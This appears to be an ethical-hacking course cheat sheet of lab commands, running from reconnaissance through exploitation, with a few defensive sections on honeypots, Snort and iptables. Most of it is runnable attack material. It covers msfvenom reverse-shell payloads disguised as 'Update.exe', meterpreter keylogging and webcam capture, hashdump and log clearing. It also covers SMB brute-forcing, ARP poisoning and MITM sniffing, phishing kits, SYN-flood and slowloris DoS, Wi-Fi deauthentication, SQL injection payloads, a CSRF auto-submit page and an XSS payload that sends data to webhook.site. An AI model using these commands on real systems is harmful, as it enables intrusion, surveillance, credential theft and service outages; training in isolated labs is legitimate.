# Recon

## 1. Google Dorking

&#x20;  site:, filetype:, intext:, inurl:, intitle:, - (to exclude text)

## 2. Video Search Engine

&#x20;  MW Metadata

## 3. Search Engines

&#x20;  Shodan

## 4. Domains and Subdomains

&#x20;  Netcraft

## 5. Email Enumeration

&#x20;  TheHarvester (email, hostnames, subdomain and Ip's)

&#x20;  theHarvester -d <domain name> -b <source like crtsh, yahoo>

## 6. Ping

&#x20;  ping <ip or domain>

## 7. Website Informer

&#x20;  Hosting, traffic and ranking, DNS detail

## 8. Data Extractor (extension)

## 9. HTTrack - Website Mirroring

## 10. CeWL - Custom wordlist generator

&#x20;   cewl <domain> -w <wordlist name>

&#x20;   cewl -d <depth> -m <mini\_length> <domian> -w <wordlist\_name>

&#x20;   For sorting

&#x20;   sort -u <wordlist\_name> -o <new\_wordlist>

# Scanning

## Evasion (IP Tables Setup)

sudo iptables -A INPUT -p tcp --sport 6000 --dport 80 -j ACCEPT

sudo iptables -A INPUT -p tcp --dport 80 -j DROP

sudo iptables -L INPUT -v -n --line-numbers

# Enumeration

## NetBIOS Enumeration

nmap -sn <Target-IP>

nmap -A -p 137,138,139 <Target-IP>

nmap -sU -p 137 --script nbstat <Target-IP>

nmap -sV -p 139,445 <Target-IP>

nmblookup -A <Target-IP>

nbtscan -v <Target-IP>

enum4linux -v -a <Target-IP>

smbclient -L //<Target-IP> -N

smbclient //<Target-IP>/tmp -N

msfconsole (get shell by exploiting samba)

## DNS Enum

dnsdumpster 

nslookup

## LDAP Enum

nmap -p 389,636,3268,3269 -sV 192.168.56.101

ldapsearch -x -H ldap://192.168.56.101 -s base -b "" "(objectClass=\*)"

nmap -p 389 --script ldap-search 192.168.56.101

ldapsearch -x -H ldap://192.168.56.101 -b "dc=lab,dc=local" "(objectClass=user)" sAMAccountName

ldapsearch -x -H ldap://192.168.56.101 -b "dc=lab,dc=local" "(objectClass=group)" cn

ldapsearch -x -H ldap://192.168.56.101 -b "dc=lab,dc=local" "(objectClass=computer)"

\-- ldeep

git clone https://github.com/franc-pentest/ldeep.git

cd ldeep

chmod +x ldeep.sh

ldeep ldap -u Administrator -p 'abc@123' -d lab.local -s ldap://192.168.29.202 computers

ldeep ldap -u Administrator -p 'abc@123' -d lab.local -s ldap://192.168.29.202 conf

ldeep ldap -u Administrator -p 'abc@123' -d lab.local -s ldap://192.168.29.202 domain\_policy

ldeep ldap -u Administrator -p 'abc@123' -d lab.local -s ldap://192.168.29.202 fsmo

ldeep ldap -u Administrator -p 'abc@123' -d lab.local -s ldap://192.168.29.202 Groups

ldeep ldap -u Administrator -p 'abc@123' -d lab.local -s ldap://192.168.29.202 machines

ldeep ldap -u raj -p Password@1 -d ignite.local -s ldap://192.168.1.20 ou

ldeep ldap -u raj -p Password@1 -d ignite.local -s ldap://192.168.1.20 users

# Exploitation and Post-Exploitation

## Password Cracking

ping -c 5 192.168.64.138

sudo nmap -sV -p 445 192.168.64.138

smbclient -L //192.168.64.138/ -N

echo -e "admin\\npassword\\n123456\\nPassword1\\nstudent\\nqwerty\\nletmein\\nwelcome1\\nAdministrator\\nmsfadmin\\nCdac@123" > /tmp/passlist.txt

hydra -l Administrator -P /tmp/passlist.txt 192.168.64.138 smb -V

smbclient //192.168.64.138/C$ -U 'Administrator%Cdac@123'

msfconsole

search smb\_login

use 0

show options

set RHOSTS 192.168.64.138

set SMBUser Administrator

set PASS\_FILE /tmp/passlist.txt

run

## VNCInject

ping -c 5 192.168.64.138

ifconfig

msfconsole

search multi/handler

use 5

set payload windows/vncinject/reverse\_tcp

set LHOST 192.168.64.137

set VIEWONLY false

exploit

sudo msfvenom -p windows/vncinject/reverse\_tcp LHOST=192.168.64.137 LPORT=4444 -f exe -o \~/Update.exe

ls -l

python3 -m http.server 8001

## Monitoring \& Surveillance

sudo msfvenom -p windows/meterpreter/reverse\_tcp lhost=192.168.64.137 lport=4444 -f exe -o \~/meter.exe

msfconsole

search multi/handler

use 5

set payload windows/meterpreter/reverse\_tcp

set LHOST 192.168.64.137

set LPORT 4444

run

ps

screenshot

keyscan\_start

keyscan\_dump

keyscan\_stop

webcam\_list

webcam\_snap

record\_mic -d 5

getdesktop

hashdump

## Hide Files Using NTFS Streams

mkdir lab

cd C:\\lab

echo "Top secret - employee data" > secret.txt

echo "Hello, my name is John." > resume.txt

type secret.txt > resume.txt:hidden.txt

dir

del secret.txt

dir

more < resume.txt:hidden.txt

dir /r

Get-Item resume.txt -Stream \*

## Clear Windows Machine Logs

sessions -l

eventvwr.msc

shell

wevtutil el

wevtutil gli Security

wevtutil qe Security /c:5 /f:text

wevtutil cl Security

wevtutil qe Security /c:5 /f:text

wevtutil cl System

wevtutil qe System /c:5 /f:text

wevtutil cl Application

wevtutil gli Security

wevtutil gli System

wevtutil gli Application

exit

clearev

wevtutil qe Security /c:5 /f:text

# Network Attacks and Traffic Analysis

## MAC Flooding using macof

ip a

ipconfig

ping -c 4 192.168.56.250

ping 192.168.56.101

wireshark --version

sudo apt update

sudo apt install -y wireshark

sudo wireshark

ping -n 4 192.168.56.101

sudo apt update

sudo apt install -y dsniff

macof --help

sudo macof -i eth1 -n 20000

## ARP Poisoning

sudo sysctl -w net.ipv4.ip\_forward=1

cat /proc/sys/net/ipv4/ip\_forward

sudo -i

arpspoof -h

apt update

apt install -y dsniff

arpspoof -h

sudo arpspoof -i eth2 -t 192.168.131.131 192.168.131.129

sudo arpspoof -i eth2 -t 192.168.131.129 192.168.131.131

sudo iptables -L FORWARD -n -v

sudo iptables -P FORWARD ACCEPT

sudo sysctl -w net.ipv4.ip\_forward=1

\-- Restore

sudo sysctl -w net.ipv4.ip\_forward=0

sudo iptables -P FORWARD DROP

arp -d \*

ping -n 4 192.168.131.129

arp -a

sudo ip neigh flush all

ping -c 4 192.168.131.131

arp -n

## Man-in-the-Middle (MITM) Attack and Password Sniffing Using Ettercap

sudo sysctl -w net.ipv4.ip\_forward=1

cat /proc/sys/net/ipv4/ip\_forward

sudo apt update

sudo apt install -y adwaita-icon-theme

sudo env GTK\_THEME=Adwaita:light GTK\_ICON\_THEME=Adwaita ettercap -G

sudo wireshark

sudo iptables -L FORWARD -n -v

sudo iptables -P FORWARD ACCEPT

sudo sysctl -w net.ipv4.ip\_forward=1

ping -n 4 192.168.131.129

ftp 192.168.131.129

## Sniff User Credentials Using the Social-Engineer Toolkit (SET)

sudo apt install set

mkdir -p \~/test-login

cd \~/test-login

nano index.html

<!DOCTYPE html>

<html>

<head>

<title>Security Training Login</title>

</head>

<body>

<h2>Security Training Login</h2>

<form method="POST">

<label>Username:</label>

<input type="text" name="username">

<br><br>

<label>Password:</label>

<input type="password" name="password">

<br><br>

<input type="submit" value="Login">

</form>

</body>

</html>

python3 -m http.server 8000

sudo setoolkit

## Phishing Using ShellPhish

sudo su

git clone https://github.com/AbirHasan2005/ShellPhish.git

cd ShellPhish

ls

chmod +x shellphish.sh

cd sites

ls

cd instagram

php -S 0.0.0.0:4000

./shellphish.sh

## Phishing Attacks Using GoPhish

sudo apt install -y python3-aiosmtpd

python3 -m aiosmtpd -n -l 0.0.0.0:1025

https://github.com/gophish/gophish/releases/download/v0.12.1/gophish-v0.12.1-linux-64bit.zip

unzip gophish-v0.12.1-linux-64bit.zip -d gophish

cd gophish

chmod +x gophish

./gophish

## Denial-of-Service

sudo nmap -sS -p 1-1000 192.168.131.129

curl -I http://192.168.131.129/

curl -s -o /dev/null -w "HTTP Status: %{http\_code} | Time: %{time\_total}s\\n" http://192.168.131.129/

sudo tcpdump -n -i <Target-Interface> tcp port 80

sudo msfconsole -q

search type:auxiliary dos synflood

use auxiliary/dos/tcp/synflood

show options

set RHOST 192.168.131.129

set RPORT 80

set NUM 10000

set INTERFACE eth2

show options

run

curl -s -o /dev/null -w "HTTP Status: %{http\_code} | Time: %{time\_total}s\\n" http://192.168.131.129/

sudo apt update

sudo apt install -y hping3

sudo tcpdump -n -i <Target-Interface> tcp port 80

sudo hping3 -S -p 80 -c 10000 -i u1000 192.168.131.129

curl -s -o /dev/null -w "HTTP Status: %{http\_code} | Time: %{time\_total}s\\n" http://192.168.131.129/

ab -n 10000 -c 50 -t 30 http://192.168.131.129/

ab -n 200 -c 50 -t 60 http://192.168.131.129/

ab -n 10000 -c 100 http://192.168.131.129/

sudo sysctl -w net.ipv4.tcp\_syncookies=1

sysctl net.ipv4.tcp\_syncookies

sudo hping3 -S -p 80 --flood 192.168.131.129

ab -n 10000 -c 100 -t 60 http://192.168.131.129/

sudo iptables -A INPUT -p tcp --syn -m limit --limit 5/second --limit-burst 10 -j ACCEPT

sudo iptables -A INPUT -p tcp --syn -j DROP

sudo iptables -L -n -v

sudo apt install -y slowhttptest

slowhttptest -c 1000 -H -g -o slowloris\_result -i 10 -r 200 -t GET -u http://192.168.131.129/ -x 24 -p 3

curl -m 5 http://192.168.131.129/

sudo iptables -D INPUT -p tcp --syn -m limit --limit 5/second --limit-burst 10 -j ACCEPT

sudo iptables -D INPUT -p tcp --syn -j DROP

sudo sysctl -w net.ipv4.tcp\_syncookies=0

ssh -o HostKeyAlgorithms=+ssh-rsa msfadmin@192.168.131.129

# Wireless Security

## Wireless Network

sudo apt update

sudo apt install aircrack-ng wireshark wifite git python3

airmon-ng

iwconfig

git clone https://github.com/Mebus/cupp.git

cd cupp

python3 cupp.py -h

python3 cupp.py -i

head -n 20 <GENERATED\_FILE>

wc -l <GENERATED\_FILE>

realpath <GENERATED\_FILE>

iwconfig

sudo airmon-ng

sudo airmon-ng start wlan0

iwconfig

sudo airodump-ng wlan0mon

sudo airodump-ng --bssid <BSSID> -c <CH> -w exercise2\_capture wlan0mon

sudo aireplay-ng --deauth 10 -a <BSSID> -c <CLIENT\_MAC> wlan0mon

sudo aireplay-ng --deauth 0 -a <BSSID> wlan0mon

wireshark exercise2\_capture-01.cap

aircrack-ng -b <BSSID> -w <WORDLIST> exercise2\_capture-01.cap

aircrack-ng exercise2\_capture-01.cap -w <WORDLIST>

sudo airodump-ng wlan0mon

sudo airodump-ng --bssid <BSSID> --channel <CH> wlan0mon

sudo aireplay-ng --deauth 10 -a <BSSID> -c <CLIENT\_MAC> wlan0mon

wifite --help

sudo airmon-ng stop wlan0mon

# Defensive Security and Monitoring

## Cowrie Honeypot

sudo apt update

sudo apt install -y git python3-venv python3-dev libssl-dev libffi-dev build-essential

sudo adduser --disabled-password cowrie

getent passwd cowrie

ls -ld /home/cowrie

sudo mkdir -p /home/cowrie

sudo chown cowrie:cowrie /home/cowrie

sudo chmod 750 /home/cowrie

sudo su - cowrie

git clone https://github.com/cowrie/cowrie.git

cd cowrie

python3 -m venv cowrie-env

source cowrie-env/bin/activate

python -m pip install --upgrade pip

python -m pip install -e .

find . -name cowrie.cfg.dist

cp src/cowrie/data/etc/cowrie.cfg.dist etc/cowrie.cfg

nano etc/cowrie.cfg

cowrie start

cowrie status

sudo iptables -t nat -A PREROUTING -i eth2 -d 192.168.131.128 -p tcp --dport 22 -j REDIRECT --to-ports 2222

sudo iptables -t nat -L PREROUTING -n -v --line-numbers

tail -f var/log/cowrie/cowrie.log

\--windows

ssh root@192.168.131.128

ssh -p 2222 root@192.168.131.128

cowrie stop

sudo iptables -t nat -D PREROUTING -i eth2 -d 192.168.131.128 -p tcp --dport 22 -j REDIRECT --to-ports 2222

cowrie stop

deactivate

exit

\--restore

sudo deluser --remove-home cowrie

getent passwd cowrie

ls -ld /home/cowrie

sudo iptables -t nat -L PREROUTING -n -v

ssh-keygen -R 192.168.131.128

ssh-keygen -R "\[192.168.131.128]:2222"

## Intrusion Detection Using Snort

sudo apt update

sudo apt install snort

snort -V

ls -al /etc/snort/

sudo nano /etc/snort/snort.lua

HOME\_NET = '192.168.131.0/24'

ips =

{

&#x20;   variables = default\_variables,

&#x20;   include = '/etc/snort/rules/local.rules'

}

sudo nano /etc/snort/rules/local.rules

alert icmp any any -> any any (msg:"ICMP Ping Detected"; sid:1000001; rev:1;)

alert icmp any any -> any any (itype:8; msg:"ICMP Echo Request (Ping)"; sid:1000002; rev:1;)

alert icmp any any -> any any (itype:0; msg:"ICMP Echo Reply (Pong)"; sid:1000003; rev:1;)

sudo snort -T -c /etc/snort/snort.lua

sudo snort -c /etc/snort/snort.lua -i eth2 -A alert\_fast

## Traffic Filtering Using Iptables

sudo iptables -L -n -v --line-numbers

sudo iptables -I INPUT 1 -s 192.168.131.131 -j DROP

sudo iptables -L INPUT -n -v --line-numbers

sudo iptables -I OUTPUT 1 -d <INSTAGRAM\_IP> -p tcp -m multiport --dports 80,443 -j REJECT --reject-with tcp-reset

sudo iptables -L OUTPUT -n -v --line-numbers

sudo iptables -I INPUT 1 -p icmp --icmp-type echo-request -j DROP

sudo iptables -I INPUT 1 -p icmp --icmp-type echo-reply -j DROP

sudo iptables -I OUTPUT 1 -p icmp --icmp-type echo-request -j DROP

sudo iptables -I OUTPUT 1 -p icmp --icmp-type echo-reply -j DROP

ping -n 4 192.168.131.128

ping -c 4 -W 2 192.168.131.131

sudo iptables -L -n -v --line-numbers

sudo iptables -I OUTPUT 1 -p tcp -m multiport --dports 80,443 -j DROP

sudo iptables -L OUTPUT -n -v --line-numbers

sudo iptables -I INPUT 1 -s 192.168.131.131 -j DROP

sudo iptables -L -n -v --line-numbers

sudo iptables -S

sudo iptables -F

sudo iptables -L -n -v

sudo iptables -S

# Web Reconnaissance and Testing

## Ghost Eye

sudo apt update

sudo apt install -y dnsutils whois httpie

git clone https://github.com/BullsEye0/ghost\_eye.git

cd ghost\_eye

ls

python3 -m venv venv

source venv/bin/activate

pip install -r requirements.txt

python3 ghost\_eye.py

## Skipfish

sudo apt update

sudo apt install -y skipfish

skipfish -h

mkdir -p \~/Tools/skipfish-lab

touch \~/Tools/skipfish-lab/learned.wl

TARGET\_URL="http://192.168.131.129/"

curl -I "$TARGET\_URL"

skipfish -o \~/Tools/skipfish-lab/report \\

\-W \~/Tools/skipfish-lab/learned.wl \\

\-d 2 -r 100 -l 1 -O "$TARGET\_URL"

firefox \~/Tools/skipfish-lab/report/index.html

## HTTPRecon and Netcat

cd /d "C:\\Users\\CLIENT01\\Downloads\\httprecon-7.3\\"

C:\\Windows\\SysWOW64\\regsvr32.exe ".\\MSCOMCTL.OCX"

C:\\Windows\\SysWOW64\\regsvr32.exe ".\\COMDLG32.OCX"

C:\\Windows\\SysWOW64\\regsvr32.exe ".\\RICHTX32.OCX"

httprecon.exe

sudo apt update

sudo apt install -y netcat-openbsd

nc -h

nc -v -w 5 192.168.131.129 80

printf 'HEAD / HTTP/1.1\\r\\nHost: 192.168.131.129\\r\\nConnection: close\\r\\n\\r\\n' | nc -w 5 192.168.131.129 80

printf 'GET / HTTP/1.1\\r\\nHost: 192.168.131.129\\r\\nConnection: close\\r\\n\\r\\n' | nc -w 5 192.168.131.129 80

printf 'OPTIONS / HTTP/1.1\\r\\nHost: 192.168.131.129\\r\\nConnection: close\\r\\n\\r\\n' | nc -w 5 192.168.131.129 80

## Whatweb

sudo apt update

sudo apt install -y whatweb

whatweb --version

curl -I https://example.com/

whatweb https://example.com/

whatweb https://cdac.in/

whatweb --log-brief=\~/whatweb\_cdac.txt https://cdac.in/

cat \~/whatweb\_cdac.txt

## Gobuster

sudo apt update

sudo apt install -y gobuster

gobuster --help

sudo apt install -y dirb

ls -l /usr/share/dirb/wordlists/common.txt

curl -I http://192.168.131.129/

gobuster dir \\

\-u http://192.168.131.129/ \\

\-w /usr/share/dirb/wordlists/common.txt \\

\-t 5 \\

\-o \~/gobuster-results.txt

cat \~/gobuster-results.txt

## Wapiti

sudo apt update

sudo apt install -y wapiti

wapiti --version

wapiti --help

curl -I http://testfire.net/

mkdir -p \~/wapiti-lab

wapiti -u https://demo.testfire.net/ --scope folder -d 2 --max-scan-time 180 --max-attack-time 180 --tasks 1 -f html -o \~/wapiti-lab/wapiti-report.html

firefox \~/wapiti-lab/wapiti-report.html/demo.testfire.net\_10112026\_1113.html

## CSRF

nano \~/csrf\_demo.html

<!DOCTYPE html>

<html>

<head>

&#x20;   <title>CSRF Lab Demonstration</title>

</head>

<body>

&#x20;   <h2>CSRF Demonstration</h2>

&#x20;   <p>Testing a forged request against the local DVWA application.</p>

&#x20;   <form id="csrf-form"

&#x20;         action="http://192.168.131.131/DVWA/vulnerabilities/csrf/"

&#x20;         method="GET">

&#x20;       <input type="hidden"

&#x20;              name="password\_new"

&#x20;              value="CSRFdemo123!">

&#x20;       <input type="hidden"

&#x20;              name="password\_conf"

&#x20;              value="CSRFdemo123!">

&#x20;       <input type="hidden"

&#x20;              name="Change"

&#x20;              value="Change">

&#x20;   </form>

&#x20;   <script>

&#x20;       document.getElementById("csrf-form").submit();

&#x20;   </script>

</body>

</html>

## SQLMap

sqlmap --version

sudo apt update

sudo apt install sqlmap -y

sqlmap -h

sqlmap -u "http://<Windows-HostOnly-IP>/DVWA/vulnerabilities/sqli/?id=1\&Submit=Submit" \\

\--cookie="PHPSESSID=YOUR\_SESSION\_ID; security=low" \\

\-p id \\

\--batch

sqlmap -u "http://<Windows-HostOnly-IP>/DVWA/vulnerabilities/sqli/?id=1\&Submit=Submit" \\

\--cookie="PHPSESSID=YOUR\_SESSION\_ID; security=low" \\

\-p id \\

\--dbs \\

\--batch

sqlmap -u "http://<Windows-HostOnly-IP>/DVWA/vulnerabilities/sqli/?id=1\&Submit=Submit" \\

\--cookie="PHPSESSID=YOUR\_SESSION\_ID; security=low" \\

\-p id \\

\-D dvwa \\

\--tables \\

\--batch

sqlmap -u "http://<Windows-HostOnly-IP>/DVWA/vulnerabilities/sqli/?id=1\&Submit=Submit" \\

\--cookie="PHPSESSID=YOUR\_SESSION\_ID; security=low" \\

\-p id \\

\-D dvwa \\

\-T users \\

\--columns \\

\--batch

sqlmap -u "http://<Windows-HostOnly-IP>/DVWA/vulnerabilities/sqli/?id=1\&Submit=Submit" \\

\--cookie="PHPSESSID=YOUR\_SESSION\_ID; security=low" \\

\-p id \\

\-D dvwa \\

\-T users \\

\-C user,first\_name,last\_name \\

\--dump \\

\--start=1 \\

\--stop=3 \\

\--batch

sqlmap -u "http://<Windows-HostOnly-IP>/DVWA/vulnerabilities/sqli/?id=1\&Submit=Submit" \\

\--cookie="PHPSESSID=YOUR\_SESSION\_ID; security=low" \\

\-p id \\

\--current-user \\

\--current-db \\

\--banner \\

\--batch

## SQL Manual

1

'

1' AND '1'='1' -- -

1' AND '1'='2' -- -

1' OR '1'='1' -- -

1' ORDER BY 1 -- -

1' ORDER BY 2 -- -

1' ORDER BY 3 -- -

\-1' UNION SELECT database(), version() -- -

\-1' UNION SELECT table\_name, NULL FROM information\_schema.tables WHERE table\_schema=database() -- -

\-1' UNION SELECT column\_name, data\_type FROM information\_schema.columns WHERE table\_schema=database() AND table\_name='users' -- -

\-1' UNION SELECT user, password FROM users -- -

\-- Boolean

1

1' AND 1=1 -- -

1' AND 1=2 -- -

1' AND SUBSTRING(database(),1,1)='d' -- -

\-- Blind

1' AND IF(1=1,SLEEP(3),0) -- -

1' AND IF(1=2,SLEEP(3),0) -- -

## Bettercap

sudo apt update

sudo apt install -y bettercap wireshark

sudo bettercap -iface eth1

help net.sniff

set net.sniff.filter host 192.168.1.32 and tcp port 80

set net.sniff.local true

net.sniff on

curl --noproxy '\*' -v 'http://192.168.1.32/?test=LAB-MARKER-731'

net.sniff off

quit

## Stored XSS

<img src="/xss-lab-missing-image.png"

&#x20;    onerror="fetch('https://webhook.site/YOUR-UUID?data=LAB-TEST')">

# Cryptography and File Protection

## Hashing

cmd

dir hacker.txt

certutil -hashfile hacker.txt MD5

certutil -hashfile hacker.txt SHA1

certutil -hashfile hacker.txt SHA256

powershell

Get-Item .\\hacker.txt

Get-FileHash .\\hacker.txt -Algorithm MD5

Get-FileHash .\\hacker.txt -Algorithm SHA1

Get-FileHash .\\hacker.txt -Algorithm SHA256

## Encryption and Decryption

cmd

dir hacker.txt

certutil -hashfile hacker.txt SHA256

gpg --symmetric --cipher-algo AES256 hacker.txt

dir hacker.txt\*

powershell -NoProfile -Command "Format-Hex -Path '.\\hacker.txt.gpg' | Select-Object -First 8"

gpg --pinentry-mode loopback --no-symkey-cache --output wrong\_password\_test.txt --decrypt hacker.txt.gpg

gpg --pinentry-mode loopback --no-symkey-cache --output decrypted\_hacker.txt --decrypt hacker.txt.gpg

type decrypted\_hacker.txt

certutil -hashfile decrypted\_hacker.txt SHA256

type .\\7zip\_recovered\\hacker.txt

certutil -hashfile .\\7zip\_recovered\\hacker.txt SHA256

# Network Services and Configuration

## DHCP Starvation

sudo yersinia dhcp -attack 1 -i eth1

\-- powershell

cd "C:\\ProgramData\\VMware"

Stop-Service VMnetDHCP

del vmnetdhcp.leases

del vmnetdhcp.leases\~

Start-Service VMnetDHCP

## Bit Locker

manage-bde -status E:

manage-bde -lock E:
